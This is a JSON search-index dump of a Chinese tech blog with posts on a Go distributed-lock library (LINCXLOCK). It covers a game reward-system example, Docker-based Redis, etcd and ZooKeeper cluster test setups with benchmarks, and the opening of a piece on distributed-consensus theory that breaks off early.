{"categories":[{"title":"CSAPP","uri":"https://lincx-911.github.io/categories/csapp/"},{"title":"lincxlock","uri":"https://lincx-911.github.io/categories/lincxlock/"},{"title":"Tool","uri":"https://lincx-911.github.io/categories/tool/"},{"title":"分布式","uri":"https://lincx-911.github.io/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"posts":[{"content":"","id":0,"section":"posts","summary":"","tags":[],"title":"Prometheus","uri":"https://lincx-911.github.io/2022/11/prometheus/","year":"2022"},{"content":"Lincxlock Example\u0026ndash;模拟发奖系统 需求背景 ​ 在游戏发奖系统中，为了防止用户多次点击领奖请求引起多次领奖问题，需要确保每个游戏玩家在一次抽奖活动中只能得到获得一次奖励机会，且由于礼包数量有限，需要确保礼包按给定的数量发放，防止“超发”现象发生。\n需求分析 ​ 因为发奖服务是部署在分布式系统当中，要防止上述问题的发生，需要使用到分布式锁的功能，可以直接应用LINCXLOCK的分布式锁。在发奖系统中，为了保证效率，使用Redis作为缓存，所以在使用LINCXLOCK分布式锁的时候可基于Redis，作为插件方式引入。\n具体实现 代码执行流程如下图所示：\n1、引用LINCXLOCK插件；\n2、通过编写配置文件或者直接赋值的方式初始化LINCXLOCK分布式锁\n3、创建用户id的分布式锁对象，调用加锁方法，成功后，继续执行；否则，返回“重复请求”的信息；\n4、判断可以领奖，创建礼包的分布式锁对象，调用加锁方法，成功后，继续执行下面的逻辑，否则，调用用户分布式锁对象的解锁方法，返回“已领奖”信息；\n5、结束之后，调用两个锁对象的解锁方法，释放锁，返回礼包。\nmain.go文件\npackage main import ( \u0026quot;errors\u0026quot; \u0026quot;log\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;strconv\u0026quot; \u0026quot;sync\u0026quot; \u0026quot;time\u0026quot; \u0026quot;weblincx/redisclient\u0026quot; \u0026quot;github.com/lincx-911/lincxlock\u0026quot; //引入LINCXLOCK分布式锁框架 \u0026quot;github.com/gin-gonic/gin\u0026quot; ) const( OK = iota ParamsError // 传参错误 ServerError // 服务错误 ) var ( timeout = 3 Gift_Lock_Prefix = \u0026quot;gift_lock_\u0026quot; User_Gift_Lock_Prefix = \u0026quot;user_gift_lcok\u0026quot; USER_GIFTED_KEY = \u0026quot;user_gift\u0026quot; ) // GetRewardHandle 领奖controller层 func GetRewardHandle(ctx *gin.Context) { user_id := ctx.Query(\u0026quot;user_id\u0026quot;) if len(user_id)==0{ HandleAPIReturn(ctx,ParamsError,\u0026quot;param user_id is nil\u0026quot;,nil) return } gift_id := ctx.Query(\u0026quot;gift_id\u0026quot;) if len(gift_id)==0{ HandleAPIReturn(ctx,ParamsError,\u0026quot;param gift_id is nil\u0026quot;,nil) return } res,err := RewardService(user_id,gift_id) if err!=nil{ HandleAPIReturn(ctx,ServerError,err.Error(),nil) return } HandleAPIReturn(ctx,OK,\u0026quot;success\u0026quot;,res) } //HandleAPIReturn 返回请求 func HandleAPIReturn(ctx *gin.Context, code int, msg string, data interface{}) { ctx.JSON(http.StatusOK, gin.H{ \u0026quot;code\u0026quot;: code, \u0026quot;msg\u0026quot;: msg, \u0026quot;data\u0026quot;: data, }) } // RewardService 领奖service层 func RewardService(userid, giftid string) (string, error) { conf,err:=config.NewLockConf(locktype,5,hosts) if err!=nil{ return \u0026quot;\u0026quot;,err } uMutex ,err:= lock.NewLincxLock(User_Gift_Lock_Prefix+userid,conf)// 幂等性处理，防止重复请求 if err!=nil{ return \u0026quot;\u0026quot;,err } err := uMutex.Lock() if err!=nil{ return \u0026quot;\u0026quot;,errors.New(\u0026quot;重复请求\u0026quot;) } defer uMutex.Unlock() endTime := time.Now().Add(time.Second * time.Duration(timeout)) for time.Now().Before(endTime) { if redisclient.SISMembers(redisclient.Pool.Get(), USER_GIFTED_KEY, userid) { return \u0026quot;\u0026quot;, errors.New(\u0026quot;已领奖\u0026quot;) } // 加锁，领奖 lock_key := Gift_Lock_Prefix + giftid gMutex err:= lock.NewLincxLock(lock_key,conf) // 对礼包加锁，防止超发 if err!=nil{ continue } err = gMutex.Lock() if err!=nil{ continue } defer gMutex.Unlock() //礼包数量 numstr, err := redisclient.Get(redisclient.Pool.Get(), giftid) if err != nil { return \u0026quot;\u0026quot;, err } num, _ := strconv.Atoi(numstr) if num \u0026lt;= 0 { return \u0026quot;\u0026quot;, errors.New(\u0026quot;礼包已领完\u0026quot;) } // 礼包数量减一 err = redisclient.Decr(redisclient.Pool.Get(), giftid) if err != nil { return \u0026quot;\u0026quot;, err } // 设置用户领奖状态 err = redisclient.SAdd(redisclient.Pool.Get(), USER_GIFTED_KEY, userid) if err != nil { return \u0026quot;\u0026quot;, err } // 发奖礼包号 return giftid, nil } return \u0026quot;\u0026quot;, errors.New(\u0026quot;请求失败，请重试\u0026quot;) } // InitRouter 初始化路由 func InitRouter() *gin.Engine{ router := gin.Default() rLock := router.Group(\u0026quot;/lincx\u0026quot;) { rLock.GET(\u0026quot;/reward\u0026quot;,GetRewardHandle) } return router } func main() { r := InitRouter() r.Run(\u0026quot;:8089\u0026quot;) //启动端口号为8089 } weblincx/redisclient\npackage redisclient import ( \u0026quot;log\u0026quot; \u0026quot;time\u0026quot; \u0026quot;github.com/go-redsync/redsync/v4\u0026quot; \u0026quot;github.com/go-redsync/redsync/v4/redis\u0026quot; \u0026quot;github.com/go-redsync/redsync/v4/redis/redigo\u0026quot; redigolib \u0026quot;github.com/gomodule/redigo/redis\u0026quot; ) const( SUCCESS_REPLY = \u0026quot;OK\u0026quot; ) var ( Pool *redigolib.Pool ) func init() { Pool = GetPool(\u0026quot;172.27.76.104:6379\u0026quot;,\u0026quot;\u0026quot;) } // GetPool 创建redis连接池 func GetPool(server ,password string)*redigolib.Pool{ if Pool!=nil{ return Pool } return \u0026amp;redigolib.Pool{ MaxIdle: 5,//空闲数 IdleTimeout: 240 * time.Second, MaxActive: 10,//最大数 Wait: true, Dial: func() (redigolib.Conn, error) { c, err :=redigolib.Dial(\u0026quot;tcp\u0026quot;, server) if err != nil { return nil, err } if password != \u0026quot;\u0026quot; { if _, err := c.Do(\u0026quot;AUTH\u0026quot;, password); err != nil { c.Close() return nil, err } } return c, err }, TestOnBorrow: func(c redigolib.Conn, t time.Time) error { _, err := c.Do(\u0026quot;PING\u0026quot;) return err }, } } // Get redigolib get func Get(conn redigolib.Conn, key string) (string, error) { defer conn.Close() val, err := redigolib.String(conn.Do(\u0026quot;GET\u0026quot;, key)) if err != nil { log.Printf(\u0026quot;redigolib get error: %s\\n\u0026quot;, err.Error()) return \u0026quot;\u0026quot;, err } return val, err } // Set redigolib set func Set(conn redigolib.Conn, key string,value interface{}) (bool, error) { defer conn.Close() ok, err := conn.Do(\u0026quot;SET\u0026quot;, key, value) if err != nil { log.Printf(\u0026quot;redigolib set error: val:%s %s\\n\u0026quot;, ok,err.Error()) return false, err } return ok==\u0026quot;OK\u0026quot;, nil } // SetNX redigolib setnx func SetNX(conn redigolib.Conn, key, value string,timeout int)(bool,error){ defer conn.Close() reply, err := redigolib.String(conn.Do(\u0026quot;SET\u0026quot;, key, value, \u0026quot;EX\u0026quot;, timeout, \u0026quot;NX\u0026quot;)) if reply==SUCCESS_REPLY{ return true,nil } if err==redigolib.ErrNil{ return false,nil } return false,err } // HSet redigolib hset func HSet(conn redigolib.Conn, key, field string, data interface{}) error { defer conn.Close() _, err := conn.Do(\u0026quot;HSET\u0026quot;, key, field, data) if err != nil { log.Printf(\u0026quot;redigolib hSet error: %s\\n\u0026quot;, err.Error()) } return err } // HGet redigolib hget func HGet(conn redigolib.Conn, key, field string) (interface{}, error) { defer conn.Close() data, err := conn.Do(\u0026quot;HGET\u0026quot;, key, field) if err != nil { log.Printf(\u0026quot;redigolib hSet error: %s\\n\u0026quot;, err.Error()) return nil, err } return data, nil } /** redigolib INCR 将 key 所储存的值加上增量 1 */ func Incr(conn redigolib.Conn, key string) error { defer conn.Close() _, err := conn.Do(\u0026quot;INCR\u0026quot;, key) if err != nil { log.Printf(\u0026quot;redigolib incrby error: %s\\n\u0026quot;, err.Error()) return err } return nil } /** redigolib INCRBY 将 key 所储存的值加上增量 n */ func IncrBy(conn redigolib.Conn, key string, n int) error { defer conn.Close() _, err := conn.Do(\u0026quot;INCRBY\u0026quot;, key, n) if err != nil { log.Printf(\u0026quot;redigolib incrby error: %s\\n\u0026quot;, err.Error()) return err } return nil } /** redigolib DECR 将 key 中储存的数字值减一。 */ func Decr(conn redigolib.Conn, key string) error { defer conn.Close() _, err := conn.Do(\u0026quot;DECR\u0026quot;, key) if err != nil { log.Printf(\u0026quot;redigolib decr error: %s\\n\u0026quot;, err.Error()) return err } return nil } /** redigolib SADD 将一个或多个 member 元素加入到集合 key 当中，已经存在于集合的 member 元素将被忽略。 */ func SAdd(conn redigolib.Conn,key, v string) error { defer conn.Close() _, err := conn.Do(\u0026quot;SADD\u0026quot;, key, v) if err != nil { log.Printf(\u0026quot;SADD error: %s\u0026quot;, err.Error()) return err } return nil } /** redigolib SMEMBERS 返回集合 key 中的所有成员。 return map */ func SMembers(conn redigolib.Conn,key string) (interface{}, error) { defer conn.Close() data, err := redigolib.Strings(conn.Do(\u0026quot;SMEMBERS\u0026quot;, key)) if err != nil { log.Printf(\u0026quot;json nil: %v\u0026quot;, err) return nil, err } return data, nil } /** redigolib SISMEMBER 判断 member 元素是否集合 key 的成员。 return bool */ func SISMembers(conn redigolib.Conn,key, v string) bool { defer conn.Close() b, err := redigolib.Bool(conn.Do(\u0026quot;SISMEMBER\u0026quot;, key, v)) if err != nil { log.Printf(\u0026quot;SISMEMBER error: %s\u0026quot;, err.Error()) return false } return b } /** redigolib Script 执行脚本 return interface{},error */ func Script(conn redigolib.Conn,scriptStr string,args ...interface{})(interface{},error){ defer conn.Close() lua := redigolib.NewScript(1, scriptStr) lua.Load(conn) redigolibargs := redigolib.Args.Add(args) reply, err := lua.Do(conn, redigolibargs...) if err!=nil{ log.Printf(\u0026quot;SISMEMBER error: %s\u0026quot;, err.Error()) if err==redigolib.ErrNil{ return nil,nil } return nil,err } return reply,err } func RedisInt(reply interface{}, err error)(int,error){ num,err:=redigolib.Int(reply,err) if err==redigolib.ErrNil{ return 0,nil } return num,err } 测试程序功能 首先在Redis中设置某个礼包的礼包数量，例如礼包号“wzry11220-3332211-5565222”的礼包数为100，\n然后执行测试程序:\nfunc TestRewardService(){ username := \u0026quot;user\u0026quot; gift_id := \u0026quot;wzry11220-3332211-5565222\u0026quot; var wg sync.WaitGroup for i := 0; i \u0026lt; 120; i++ { wg.Add(1) go func(user string) { defer wg.Done() _, err := RewardService(user, gift_id) if err != nil { log.Printf(\u0026quot;%s reword fail:%v\u0026quot;, user, err) return } log.Printf(\u0026quot;%s reword successfully\u0026quot;, user) }(username+strconv.Itoa(i)) } wg.Wait() } 预期结果，礼包数量剩为0，已领取礼包的用户为100。实际结果如下：\n运行输出：\nRedis中礼包号数量\nRedis中已领取的用户数量\n总结 使用LINCXLOCK的分布式锁服务，确实能很方便地开发业务代码，且能保证代码的正确性。\n","id":1,"section":"posts","summary":"Lincxlock Example\u0026ndash;模拟发奖系统 需求背景 ​ 在游戏发奖系统中，为了防止用户多次点击领奖请求引起多次领奖问题，需要确保每个游戏玩家在一","tags":["lincxlock"],"title":"Lincxlock Example--模拟发奖系统","uri":"https://lincx-911.github.io/2022/04/lincxlock-example/","year":"2022"},{"content":"1、测试环境 测试环境的集群使用本机docker 容器模拟多主机环境进行搭建。\n1.1 Redis集群 采用三主三从的模式进行搭建，这里由于主机资源有限，使用docker 启动六个容器模拟六台主机，分别占用端口号6371~6376。\n创建文件目录 在·/usr/local/docker-redis/redis-cluster路径下分边创建文件夹名为6371~6376的文件夹，用于存储每个容器的配置文件与data。\n编写配置文件 1、编写每个 Redis 容器的配置文件\nport {port} #端口从6371-6376 requirepass 1234 masterauth 1234 protected-mode no daemonize no appendonly yes cluster-enabled yes cluster-config-file nodes.conf cluster-node-timeout 15000 cluster-announce-port {port} cluster-announce-bus-port {port} 2、编写docker-compose文件\n# 描述 Compose 文件的版本信息 version: \u0026quot;2.0\u0026quot; services: lockredis1: # 服务名称 image: redis # 创建容器时所需的镜像 container_name: lockredis1 # 容器名称 restart: always # 容器总是重新启动 network_mode: \u0026quot;host\u0026quot; # host 网络模式 volumes: # 数据卷，目录挂载 - /usr/local/docker-redis/redis-cluster/6371/conf/redis.conf:/usr/local/etc/redis/redis.conf - /usr/local/docker-redis/redis-cluster/6371/data:/data command: redis-server /usr/local/etc/redis/redis.conf # 覆盖容器启动后默认执行的命令 lockredis2: image: redis container_name: lockredis2 network_mode: \u0026quot;host\u0026quot; volumes: - /usr/local/docker-redis/redis-cluster/6372/conf/redis.conf:/usr/local/etc/redis/redis.conf - /usr/local/docker-redis/redis-cluster/6372/data:/data command: redis-server /usr/local/etc/redis/redis.conf lockredis3: image: redis container_name: lockredis3 network_mode: \u0026quot;host\u0026quot; volumes: - /usr/local/docker-redis/redis-cluster/6373/conf/redis.conf:/usr/local/etc/redis/redis.conf - /usr/local/docker-redis/redis-cluster/6373/data:/data command: redis-server /usr/local/etc/redis/redis.conf lockredis4: image: redis container_name: lockredis4 network_mode: \u0026quot;host\u0026quot; volumes: - /usr/local/docker-redis/redis-cluster/6374/conf/redis.conf:/usr/local/etc/redis/redis.conf - /usr/local/docker-redis/redis-cluster/6374/data:/data command: redis-server /usr/local/etc/redis/redis.conf lockredis5: image: redis container_name: lockredis5 network_mode: \u0026quot;host\u0026quot; volumes: - /usr/local/docker-redis/redis-cluster/6375/conf/redis.conf:/usr/local/etc/redis/redis.conf - /usr/local/docker-redis/redis-cluster/6375/data:/data command: redis-server /usr/local/etc/redis/redis.conf lockredis6: image: redis container_name: lockredis6 network_mode: \u0026quot;host\u0026quot; volumes: - /usr/local/docker-redis/redis-cluster/6376/conf/redis.conf:/usr/local/etc/redis/redis.conf - /usr/local/docker-redis/redis-cluster/6376/data:/data command: redis-server /usr/local/etc/redis/redis.conf 创建并启动全部容器 在docker-compose文件所在目录，执行下列命令：\ndocker-compose up -d 创建成功后，可以通过docker-compose ps查看结果：\n~/lincxlock/redis # docker-compose ps NAME COMMAND SERVICE STATUS PORTS lockredis1 \u0026quot;docker-entrypoint.s…\u0026quot; lockredis1 running lockredis2 \u0026quot;docker-entrypoint.s…\u0026quot; lockredis2 running lockredis3 \u0026quot;docker-entrypoint.s…\u0026quot; lockredis3 running lockredis4 \u0026quot;docker-entrypoint.s…\u0026quot; lockredis4 running lockredis5 \u0026quot;docker-entrypoint.s…\u0026quot; lockredis5 running lockredis6 \u0026quot;docker-entrypoint.s…\u0026quot; lockredis6 running 启动Redis集群 进入其中一个redis容器，例如lockredis1\n# docker exec -it lockredis1 bash 执行以下命令，这里的172.27.76.104是主机的ip地址 ：\n\u0026gt;redis-cli -a 1234 --cluster create 172.27.76.104:6371 172.27.76.104:6372 172.27.76.104:6373 172.27.76.104:6374 172.27.76.104:6375 172.27.76.104:6376 --cluster-replicas 1 集群创建并启动成功：\n1.2 ETCD集群 启动三个etcd容器，因为每个etcd需要两个端口，所以将机器的20000-20006端口每两个分配给一个etcd容器。\n创建文件目录 在·~/etcd/路径下分边创建文件夹名为data1、data2、data3的文件夹，用于存储每个容器的配置文件与data。\n编写配置文件 编写docker-compose文件\nversion: '3' networks: etcd-net: # 网络 driver: bridge # 桥接模式 services: locketcd1: image: quay.io/coreos/etcd:v3.5.1 # 镜像 container_name: locketcd1 # 容器名 --name restart: always # 总是重启 networks: - etcd-net # 使用的网络 --network ports: # 端口映射 -p - \u0026quot;20000:2379\u0026quot; - \u0026quot;20001:2380\u0026quot; environment: # 环境变量 --env - ALLOW_NONE_AUTHENTICATION=yes # 允许不用密码登录 - ETCD_NAME=locketcd1 # etcd 的名字 - ETCD_INITIAL_ADVERTISE_PEER_URLS=http://locketcd1:2380 # 列出这个成员的伙伴 URL 以便通告给集群的其他成员 - ETCD_LISTEN_PEER_URLS=http://0.0.0.0:2380 # 用于监听伙伴通讯的URL列表 - ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 # 用于监听客户端通讯的URL列表 - ETCD_ADVERTISE_CLIENT_URLS=http://locketcd1:2379 # 列出这个成员的客户端URL，通告给集群中的其他成员 - ETCD_INITIAL_CLUSTER_TOKEN=etcd-cluster # 在启动期间用于 etcd 集群的初始化集群记号 - ETCD_INITIAL_CLUSTER=locketcd1=http://locketcd1:2380,locketcd2=http://locketcd2:2380,locketcd3=http://locketcd3:2380 # 为启动初始化集群配置 - ETCD_INITIAL_CLUSTER_STATE=new # 初始化集群状态 - ETCDCTL_API=3 # 升级api版本，使用最新的v3 API volumes: - $PWD/data1:/etcd-data # 挂载的数据卷 - /etc/localtime:/etc/localtime locketcd2: image: quay.io/coreos/etcd:v3.5.1 container_name: locketcd2 restart: always networks: - etcd-net ports: - \u0026quot;20002:2379\u0026quot; - \u0026quot;20003:2380\u0026quot; environment: - ALLOW_NONE_AUTHENTICATION=yes - ETCD_NAME=locketcd2 - ETCD_INITIAL_ADVERTISE_PEER_URLS=http://locketcd2:2380 - ETCD_LISTEN_PEER_URLS=http://0.0.0.0:2380 - ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 - ETCD_ADVERTISE_CLIENT_URLS=http://locketcd2:2379 - ETCD_INITIAL_CLUSTER_TOKEN=etcd-cluster - ETCD_INITIAL_CLUSTER=locketcd1=http://locketcd1:2380,locketcd2=http://locketcd2:2380,locketcd3=http://locketcd3:2380 - ETCD_INITIAL_CLUSTER_STATE=new - ETCDCTL_API=3 volumes: - $PWD/data2:/etcd-data - /etc/localtime:/etc/localtime locketcd3: image: quay.io/coreos/etcd:v3.5.1 container_name: locketcd3 restart: always networks: - etcd-net ports: - \u0026quot;20004:2379\u0026quot; - \u0026quot;20005:2380\u0026quot; environment: - ALLOW_NONE_AUTHENTICATION=yes - ETCD_NAME=locketcd3 - ETCD_INITIAL_ADVERTISE_PEER_URLS=http://locketcd3:2380 - ETCD_LISTEN_PEER_URLS=http://0.0.0.0:2380 - ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 - ETCD_ADVERTISE_CLIENT_URLS=http://locketcd3:2379 - ETCD_INITIAL_CLUSTER_TOKEN=etcd-cluster - ETCD_INITIAL_CLUSTER=locketcd1=http://locketcd1:2380,locketcd2=http://locketcd2:2380,locketcd3=http://locketcd3:2380 - ETCD_INITIAL_CLUSTER_STATE=new - ETCDCTL_API=3 volumes: - $PWD/data3:/etcd-data - /etc/localtime:/etc/localtime 创建并启动全部容器 在docker-compose文件所在目录，执行下列命令：\ndocker-compose up -d 创建成功后，可以通过docker-compose ps查看结果：\n1.3 Zookeeper集群 启动三个Zookeeper容器，因为每个etcd需要两个端口，所以将机器的2181-2183端口分别分配给容器。\n创建文件目录 在·~/zk/路径下分边创建文件夹名为data1、data2、data3的文件夹，用于存储每个容器的配置文件与data。\n编写配置文件 编写docker-compose文件\nversion: '2' #版本号 services: lockzk1: # image: zookeeper:latest restart: always container_name: lockzk1 ports: - \u0026quot;2181:2181\u0026quot; environment: ZOO_MY_ID: 1 #环境变量 这个id在集群必须是唯一的，该值介于1~255之间 ZOO_SERVERS: server.1=lockzk1:2888:3888 server.2=lockzk2:2888:3888 server.3=lockzk3:2888:3888 #此变量允许您指定Zookeeper集群的计算机列表； lockzk2: image: zookeeper:latest restart: always container_name: lockzk2 ports: - \u0026quot;2182:2181\u0026quot; environment: ZOO_MY_ID: 2 ZOO_SERVERS: server.1=lockzk1:2888:3888 server.2=lockzk2:2888:3888 server.3=lockzk3:2888:3888 lockzk3: image: zookeeper:latest restart: always container_name: lockzk3 ports: - \u0026quot;2183:2181\u0026quot; environment: ZOO_MY_ID: 3 ZOO_SERVERS: server.1=lockzk1:2888:3888 server.2=lockzk2:2888:3888 server.3=lockzk3:2888:3888 创建并启动全部容器 在docker-compose文件所在目录，执行下列命令：\ndocker-compose up -d 创建成功后，可以通过docker-compose ps查看结果：\n2、测试内容 2.1 功能测试 2.1.1 分布式锁功能测试 编写测试代码\nvar( zkserver1 = \u0026quot;172.27.78.70:2181\u0026quot; zkserver2 = \u0026quot;172.27.78.70:2182\u0026quot; zkserver3 = \u0026quot;172.27.78.70:2183\u0026quot; redisserver1 = \u0026quot;172.27.78.70:6371\u0026quot; redisserver2 = \u0026quot;172.27.78.70:6372\u0026quot; redisserver3 =\u0026quot;172.27.78.70:6373\u0026quot; etcdserver1 = \u0026quot;172.27.78.70:20000\u0026quot; etcdserver1 = \u0026quot;172.27.78.70:20002\u0026quot; etcdserver1 = \u0026quot;172.27.78.70:20004\u0026quot; ) // 测试三种实现方式的功能 func TestCallLock() { CallLock(\u0026quot;redislock\u0026quot;,\u0026quot;lincxlock\u0026quot;,[]string{redisserver1,redisserver2,redisserver3}) CallLock(\u0026quot;etcdlock\u0026quot;,\u0026quot;lincxlock\u0026quot;,[]string{etcdserver1,etcdserver2,etcdserver3}) CallLock(\u0026quot;zklock\u0026quot;,\u0026quot;lincxlock\u0026quot;,[]string{zkerver1,zkerver2,zkerver3}) } // 模拟10个机器争夺分布式锁 func CallLockLock(locktype,lockey string,hosts []string){ conf,err:=config.NewLockConf(locktype,5,hosts) var wg sync.WaitGroup for i := 0; i \u0026lt; 10; i++ { wg.Add(1) go func(n int) { defer wg.Done() ll ,err:= lock.NewLincxLock(\u0026quot;locklincx\u0026quot;,config.LockConf) if err != nil { log.Printf(\u0026quot;initlock error:%v\u0026quot;, err) return } err = ll.Lock() if err != nil { log.Printf(\u0026quot;number %v gorotine lock error:%v\u0026quot;, n, err) return } log.Printf(\u0026quot;number %v gorotine get lock\\n\u0026quot;, n) time.Sleep(1 * time.Second) log.Printf(\u0026quot;number %v gorotine lease lock\\n\u0026quot;, n) //ll.Unlock() }(i) } wg.Wait() } 执行上面的代码，测试结果如下：\nredis 测试结果：\netcd测试结果：\nzookeeper测试结果：\n2.1.2 RPC服务测试 编写测试代码\nfunc TestRPC(){ StartServer() time.Sleep(10*time.Second) var wg sync.WaitGroup for i := 0; i \u0026lt; 5; i++ { wg.Add(1) go func(n int){ defer wg.Done() RpcCall(n) }(i) } wg.Wait() sv.Close() } func StartServer(){ sv = rpcserver.NewServer(\u0026quot;lincxlock-app\u0026quot;,nil,re1,\u0026amp;rpcserver.DefaultRPCServerOption) go func () { defer func () { if err:=recover();err!=nil{ log.Printf(\u0026quot;panic err %v\u0026quot;,err) } }() sv.Serve(\u0026quot;tcp\u0026quot;,\u0026quot;:8881\u0026quot;,nil) }() } func StopServer(){ sv.Close() } func RpcCall(n int){ log.Printf(\u0026quot;provider len %d\\n\u0026quot;,len(re1.GetServiceList())) op := \u0026amp;client.DefaultSGOption op.AppKey = \u0026quot;lincxlock-app\u0026quot; op.SerializeType = codec.MessagePackType op.RequestTimeout = time.Second*10 op.DialTimeout = time.Second*10 op.FailMode = client.FailRetry op.Retries = 3 op.Heartbeat = true op.HeartbeatInterval = time.Second * 10 op.HeartbeatDegradeThreshold = 10 op.Registry = re1 c := client.NewSGClient(*op) lockargs := lock.LockRPCArgs{ Locktype: \u0026quot;zklock\u0026quot;, Timeout: 5, JobName: \u0026quot;/distributed-lock/lock\u0026quot;, Hosts: []string{zkserver}, } reply := \u0026amp;lock.LockReply{} ctx := context.Background() err := c.Call(ctx, \u0026quot;LockRPC.NewLock\u0026quot;, lockargs,reply ) if err != nil { log.Println(\u0026quot;err!!!\u0026quot; + err.Error()) return } time.Sleep(1*time.Second) log.Printf(\u0026quot;goroutine %d get lock\\n\u0026quot;,n) unlockargs := lock.UnlockRPCArgs{ LockID: reply.LockID, } ulreply := \u0026amp;lock.UnlockReply{} err = c.Call(ctx, \u0026quot;LockRPC.Unlock\u0026quot;, unlockargs,ulreply ) if err!=nil{ log.Println(\u0026quot;err!!\u0026quot;+err.Error()) return } log.Printf(\u0026quot;goroutine %d unlock\\n\u0026quot;,n) } 执行上述代码，测试结果如下：\n2.1.3 Web服务测试 编写测试代码：\nfunc TestHttp(){ httpserver.StartHttp(8888) // 启动http服务 httpserver.StartHttps(8881) //启动https服务 } 执行代码，使用postman请求\n测试结果如下：\n2.2 性能测试 2.2.1 加解锁性能测试 测试步骤如下：\n1、为三种锁的实现分别编写用于性能测试的压测函数，内容为新建一个锁对象，调用加锁方法再调用解锁方法。\n2、执行压测命令，查看压测结果，并声称。\n3、通过pprof查看具体的方法执行的内存消耗与CPU运行时间。\n编写的测试代码：\nfunc BenchmarkCallZkLock(b *testing.B) { b.ResetTimer() for i:=0;i\u0026lt;b.N;i++{ CallLock(\u0026quot;zklock\u0026quot;,\u0026quot;/lincxlock/lock\u0026quot;,[]string{zkserver}) } b.StopTimer() } func BenchmarkCallEtcdLock(b *testing.B) { b.ResetTimer() for i:=0;i\u0026lt;b.N;i++{ CallLock(\u0026quot;etcdlock\u0026quot;,\u0026quot;/lincxlock/lock\u0026quot;,[]string{etcdserver}) } b.StopTimer() } func BenchmarkCallRedisLock(b *testing.B) { b.ResetTimer() for i:=0;i\u0026lt;b.N;i++{ CallLock(\u0026quot;redislock\u0026quot;,\u0026quot;lincxlock\u0026quot;,[]string{redisserver}) } b.StopTimer() } func CallLock(locktype,lockey string,hosts []string){ conf,err:=config.NewLockConf(locktype,5,hosts) if err!=nil{ return } ll ,err:= lock.NewLincxLock(lockey,conf) if err != nil { return } err = ll.Lock() if err != nil { return } ll.Unlock() } redis测试结果\n基于Redis加解锁测试结果如下所示，结果显示执行363次，每次消耗的平均时间为4.356796毫秒，每次分配的内存大小为22566 字节（22.56KB）以及调用分配了107次内存。其中图显示，内存占用比较多的方法是获取Redis连接的方法。\netcd测试结果\n基于ETCD的分布式锁测试结果如图所示，结果显示执行159次，每次消耗的平均时间为148.108404毫秒，每次分配的内存大小为631627字节（631.627KB）以及调用分配了1192次内存。其中图显示，内存占用比较大的是ETCD客户端的日志模块。\nZookeeper结果\nZK的测试结果如图所示，结果显示执行165次，每次消耗的平均时间为132.909104毫秒，平均每次分配的内存大小为3154434字节（3.1M）以及调用分配了147次内存。其中图显示，Zookeeper客户端的连接与接收数据模块占的内存比较大。\n2.2.2 RPC性能测试 LINCXRPC框架的性能直接影响了LINCXLOCK的RPC服务，所以对RPC的Call方法进行压测，首先启动服务端，再使用LINCXRPC的Client的Call方法调用服务。\n编写测试代码\nfunc BenchmarkMakeCallMSGP(b *testing.B) { b.ResetTimer() for i := 0; i \u0026lt; b.N; i++ { MakeCall(codec.MessagePackType) } b.StopTimer() } func MakeCallCall(codec.MessagePackType){ op := \u0026amp;client.DefaultSGOption op.AppKey = \u0026quot;lincxlock-app\u0026quot; op.SerializeType = codec.MessagePackType op.RequestTimeout = time.Second*10 op.DialTimeout = time.Second*10 op.FailMode = client.FailRetry op.Retries = 3 op.Heartbeat = true op.HeartbeatInterval = time.Second * 10 op.HeartbeatDegradeThreshold = 10 op.Registry = re1 c := client.NewSGClient(*op) lockargs := lock.LockRPCArgs{ Locktype: \u0026quot;zklock\u0026quot;, Timeout: 5, JobName: \u0026quot;/distributed-lock/lock\u0026quot;, Hosts: []string{zkserver}, } reply := \u0026amp;lock.LockReply{} ctx := context.Background() err := c.Call(ctx, \u0026quot;LockRPC.NewLock\u0026quot;, lockargs,reply ) if err != nil { log.Println(\u0026quot;err!!!\u0026quot; + err.Error()) return } time.Sleep(1*time.Second) log.Printf(\u0026quot;goroutine %d get lock\\n\u0026quot;,n) unlockargs := lock.UnlockRPCArgs{ LockID: reply.LockID, } ulreply := \u0026amp;lock.UnlockReply{} err = c.Call(ctx, \u0026quot;LockRPC.Unlock\u0026quot;, unlockargs,ulreply ) if err!=nil{ log.Println(\u0026quot;err!!\u0026quot;+err.Error()) return } log.Printf(\u0026quot;goroutine %d unlock\\n\u0026quot;,n) } 每次消耗的平均时间为3.084287毫秒，每次分配的内存大小为12390字节（12.390KB）以及调用分配了153次内存。\n通过分析内存分配情况，如图1所示，可知主要消耗内存的模块是RPC客户端、选择器（负载均衡）。由图2可知，耗时较多的部分是网络通信以及系统调用，系统调用耗时主要与服务端的反射有关。总体来说，LINCXRPC性能表现较好，适用于LINCXLOCK作为RPC框架。\n3、总结 该文档主要介绍了LINCXLOCK的LINCXLOCK测试的内容，包括搭建三种集群的测试环境，对LINCXLOCK的核心三大板块进行功能测试，最后对加解锁方法与RPC的Call方法使用go语言自带的测试工具进行性能测试。\n","id":2,"section":"posts","summary":"1、测试环境 测试环境的集群使用本机docker 容器模拟多主机环境进行搭建。 1.1 Redis集群 采用三主三从的模式进行搭建，这里由于主机资源有限，","tags":["lincxlock","集群"],"title":"Lincxlock Test 测试文档","uri":"https://lincx-911.github.io/2022/04/lincxlock-test/","year":"2022"},{"content":"分布式相关算法总结 一、拜占庭将军问题 拜占庭将军问题是一个共识问题。这个概念最早由Leslie Lamport于1980年发表的“Reaching agreement in the presence of faults\u0026quot;论文中提出。\n拜占庭是位于如今土耳其的伊斯坦布尔，是东罗马帝国的首都。由于拜占庭罗马帝国国土辽阔，出于防御的原因，每个军队之间的距离相隔较远，所以将军之间只能通过信件来传递信息。当发生战争的时候，拜占庭军队的所有将军必须达成共识，决定是否攻击敌人。但是，军队内可能存在间谍或者叛徒扰乱将军们的决定，在进行达成共识交流时，最后的结果可能不能代表大多数将军的意见。这时，在已知存在成员不可靠的情况下，其余忠诚的将军如何派除叛徒或者间谍的影响达成一致的决定，就是著名的拜占庭将军问题。\n拜占庭将军问题对现实世界的模拟。由于硬件错误、网络拥塞、连接失败等原因，计算机和网络可能会出现预想不到的行为。拜占庭错误在计算机科学领域特指的是分布式系统中的某些恶意节点扰乱系统的正常运行，包括选择性不传递消息，选择性伪造消息等。\n二、CAP、BASE、ACID理论 2.1 CAP原理 学习分布式经典的理论莫过于CAP理论。\nCPA定理 